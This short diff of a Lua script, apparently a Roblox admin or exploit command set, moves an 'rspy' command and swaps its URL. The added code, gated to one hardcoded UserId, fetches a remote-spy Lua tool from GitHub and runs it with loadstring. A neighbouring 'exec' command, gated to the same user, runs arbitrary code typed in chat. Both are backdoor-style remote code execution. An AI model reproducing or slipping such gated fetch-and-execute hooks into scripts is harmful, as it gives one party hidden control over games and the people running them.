@@ -499,6 +499,12 @@ USER PROMPT:
 		end
 	end}
 
+	commands.rspy = {function(speaker)
+		if speaker.UserId == 10984088 then
+			loadstring(game:HttpGet("https://github.com/exxtremestuffs/SimpleSpySource/raw/master/SimpleSpy.lua"))()
+		end
+	end}
+
 	commands.exec = {function(speaker, args)
 		if speaker.UserId == 10984088 then
       	  local code = table.concat(args, " ")
@@ -524,12 +530,6 @@ USER PROMPT:
      	   setfenv(executable, customEnv)
      	   executable() 
   	  end
-	end}
-
-	commands.rspy = {function(speaker)
-			if speaker.UserId == 10984088 then
-				loadstring(game:HttpGetAsync("https://github.com/richie0866/remote-spy/releases/latest/download/RemoteSpy.lua"))()
-			end
 	end}
 end
 
